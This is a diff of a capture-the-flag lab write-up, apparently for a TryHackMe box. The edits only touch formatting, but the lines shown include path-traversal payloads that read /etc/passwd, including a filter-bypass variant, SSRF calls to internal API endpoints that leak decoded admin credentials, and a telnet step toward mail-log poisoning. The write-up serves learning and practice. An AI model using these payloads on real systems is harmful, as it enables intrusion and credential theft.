@@ -185,7 +185,7 @@ http://10.10.64.179:4000/signin
 http://10.10.64.179:4000/signin
 ```
 
-i foudn the login page here and try to use the credentials found on the page that was guest/guest and successfully loged in
+I foudn the login page here and try to use the credentials found on the page that was guest/guest and successfully loged in
 
 ```
 guest
@@ -227,20 +227,20 @@ Next lets see on api
 
 <img width="890" height="541" alt="Screenshot From 2025-08-10 07-45-00" src="https://github.com/user-attachments/assets/5e964c8d-e5b6-4880-9e9c-943ffe876722" />
 
-```python
+```
 http://127.0.0.1:5000/internal-api
 
 data:application/json; charset=utf-8;base64,eyJzZWNyZXRLZXkiOiJzdXBlclNlY3JldEtleTEyMyIsImNvbmZpZGVudGlhbEluZm8iOiJUaGlzIGlzIHZlcnkgY29uZmlkZW50aWFsIGluZm9ybWF0aW9uLiBIYW5kbGUgd2l0aCBjYXJlLiJ9
 ```
 
-```python
+```
 http://127.0.0.1:5000/getAllAdmins101099991
 
 data:application/json; charset=utf-8;base64,eyJSZXZpZXdBcHBVc2VybmFtZSI6ImFkbWluIiwiUmV2aWV3QXBwUGFzc3dvcmQiOiJhZG1pbkAhISEiLCJTeXNNb25BcHBVc2VybmFtZSI6ImFkbWluaXN0cmF0b3IiLCJTeXNNb25BcHBQYXNzd29yZCI6IlMkOSRxazZkIyoqTFFVIn0=
 
 ```
 
-```python
+```
 {"ReviewAppUsername":"admin","ReviewAppPassword":"admin@!!!","SysMonAppUsername":"administrator","SysMonAppPassword":"S$9$qk6d#**LQU"}
 ```
 
@@ -255,7 +255,7 @@ Viewing the source page If you cant try use chrome or disable the javascript[js]
 
 <img width="1915" height="485" alt="Screenshot From 2025-08-10 07-52-10" src="https://github.com/user-attachments/assets/78bf6c2f-615b-4de5-a8a6-6357c6d02da5" />
 
-```python
+```
 view-source:http://10.10.64.179:50000/profile.php?img=../../../../../../../../../etc/hosts
 http://10.10.64.179:50000/profile.php?img=....//....//....//....//....//....//....//....//....//etc/passwd
 ```
@@ -272,7 +272,7 @@ i try apache2 log poisone but i remembed there was 25 port open lets try to acce
 
 <img width="1915" height="485" alt="Screenshot From 2025-08-10 08-03-02" src="https://github.com/user-attachments/assets/108a676f-065a-477f-b610-a58319338462" />
 
-```python
+```
 ~/Desktop/redteam/THM/include » telnet 10.10.64.179 25                                             130 ↵ cyberkid@kali
 Trying 10.10.64.179...
 Connected to 10.10.64.179.
